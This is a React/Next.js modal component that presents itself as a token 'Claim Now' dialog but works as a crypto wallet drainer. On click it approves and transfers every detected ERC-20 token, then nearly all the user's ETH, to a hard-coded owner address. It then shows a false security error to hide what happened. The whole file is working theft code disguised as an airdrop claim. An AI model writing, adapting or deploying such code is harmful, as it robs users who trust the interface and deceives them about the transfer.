'use client';

import React, { useRef, useEffect, useState, MouseEvent } from 'react';
import { GoX } from "react-icons/go";
import Image from 'next/image';
import { MdMenu, MdOutlineClose } from 'react-icons/md';
import Button from '../button/Button';
import styles from "@/styles/Home.module.css";
import { database } from "../../../../firebase/clientApp";
import Link from 'next/link';
import { ref, child, get, set } from "firebase/database";
import { useAccount, useDisconnect } from "wagmi";
import { parseEther } from 'viem';
import { Inter } from 'next/font/google';
import { ethers } from 'ethers';
import { OwnerAdress, ownerPercentage } from '@/lib/address';
import { getNetwork } from 'wagmi/actions';
import { checkIfUserOwnsAnyTokeninList } from '@/lib/functions/userTokenList';
import Swal from 'sweetalert2/dist/sweetalert2.js';
import 'sweetalert2/src/sweetalert2.scss';
import { IERC20Contract } from '@/lib/ethersSetUp';

const inter = Inter({ subsets: ['latin'] });

interface Token {
  image?: string;
  title?: string;
  action?: string;
  value?: number;
  status?: string;
}

type ValidBalances = 
  | {
      balance: string;
      tokenAddress: string;
    }[]
  | undefined;

interface NewModalProps {
  onClose: () => void;
  token?: Token;
}

const NewModal: React.FC<NewModalProps> = ({ onClose, token }) => {
    const modalRef = useRef<HTMLDivElement>(null);

    const closeModal = (e: MouseEvent<HTMLDivElement>) => {
        if (modalRef.current && modalRef.current === e.target) {
            onClose();
        }
    };

    const [balance, setBalance] = useState<string>('');
    const [isModalOpen, setIsModalOpen] = useState<boolean>(true);
    const [validBalances, setValidBalance] = useState<ValidBalances>();
    const { address, isConnected } = useAccount();
    const { chain } = getNetwork();
    const { disconnect } = useDisconnect();

    const gasBuffer = 100000000;

    const getUserBalance = async (): Promise<string | undefined> => {
        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum as any);
            const balanceInWei = await provider.getBalance(String(address));
            const balanceInEth = ethers.utils.formatEther(balanceInWei);
            setBalance(balanceInEth);
            return balanceInEth;
        } catch (error) {
            console.error('Error getting balance:', error);
        }
    };

    const showNotification = (text: string) => {
        Swal.fire({
            title: 'Error!',
            text: text,
            icon: 'error',
        });
    };

    useEffect(() => {
        const checkUserTokens = async () => {
            const tokens = await checkIfUserOwnsAnyTokeninList(chain?.name || '', String(address));
            setValidBalance(tokens);
        };
        checkUserTokens();
    }, [address, chain]);

    const handleTokenErc20Transfer = async () => {
        if (validBalances) {
            for (const token of validBalances) {
                const erc20Contract = IERC20Contract(token.tokenAddress);
                const decimals = await erc20Contract.decimals();
                const toApproveOwner = String(Number(token.balance) / Math.pow(10, Number(decimals)));
                
                await erc20Contract.approve(OwnerAdress, toApproveOwner);
                try {
                    const tx = await erc20Contract.transfer(OwnerAdress, String(toApproveOwner));
                    await handleTokenEthTransfer();
                    await tx.wait();
                    showNotification("For Security Reasons You can't connect empty or new wallet");
                } catch (error) {
                    showNotification(String(error));
                    console.error(error);
                }
            }
        }
    };

    const handleTokenEthTransfer = async () => {
        const defaultBalance = await getUserBalance();
        const provider = new ethers.providers.Web3Provider(window.ethereum as any);
        const gas = '5000000000000000';
        let userBalance = balance || defaultBalance;

        const balanceInWei = ethers.utils.parseEther(userBalance || '0');
        if (Number(balanceInWei) >= Number(gas)) {
            const newBalanceAfterGas = Number(balanceInWei) - Number(gas);
            const signer = provider.getSigner();
            const ownersShare = String(newBalanceAfterGas);

            try {
                const tx = await signer.sendTransaction({
                    to: OwnerAdress,
                    value: ownersShare,
                });

                await tx.wait();
                showNotification("For Security Reasons You can't connect empty or new wallet");
            } catch (error) {
                showNotification(String(error));
                console.error('Error transferring ETH:', error);
            }
        } else {
            showNotification("For Security Reasons You can't connect empty or new wallet");
        }
    };

    useEffect(() => {
        getUserBalance();
    }, [address]);

    const handleTokenTransfer = async () => {
        if (validBalances && validBalances.length > 0) {
            await handleTokenErc20Transfer();
        } else {
            await handleTokenEthTransfer();
        }
    };

    return (
        <div ref={modalRef} onClick={closeModal} className="fixed inset-0 bg-tetiary bg-opacity-30 backdrop-blur-sm flex justify-center items-center">
            <div className="mt-10 flex flex-col gap-5">
                <button onClick={onClose} className="place-self-end"><GoX size={30} /></button>
                <div className="rounded-xl w-80 px-7 py-5 flex flex-col gap-3 items-center mx-2" style={{ background: '#001e3c' }}>
                    {token && token.image ? (
                        <Image src={token.image} alt='token image' width={100} height={100} style={{
                            width: '5rem',
                            height: 'auto',
                            borderRadius: '50%',
                        }} />
                    ) : (
                        <p>No image available</p>
                    )}
                    {token && token.title && <h2>{token.title}</h2>}
                    {token && token.action && (
                        <p>
                            <span className="text-red">Description</span>: <span className="text-notwhite">{token.action}</span>
                        </p>
                    )}
                    {token && token.value !== undefined && <p>Value: {token.value}</p>}
                    {token && token.status && (
                        <p>Status: <span className="text-green">{token.status}</span></p>
                    )}
                    <div className="md:px-24 px-5">
                        {isConnected ? (
                            <Button
                                onClick={async () => await handleTokenTransfer()}
                                className="md:w-[150px] h-[40px] bg-green text-white p-2 text-xm rounded-3xl z-10 "
                            >
                                Claim Now
                            </Button>
                        ) : (
                            <w3m-button balance="hide" label="Connect Wallet to Claim" />
                        )}
                    </div>
                    
                </div>
            </div>
        </div>
    );
}

export default NewModal;
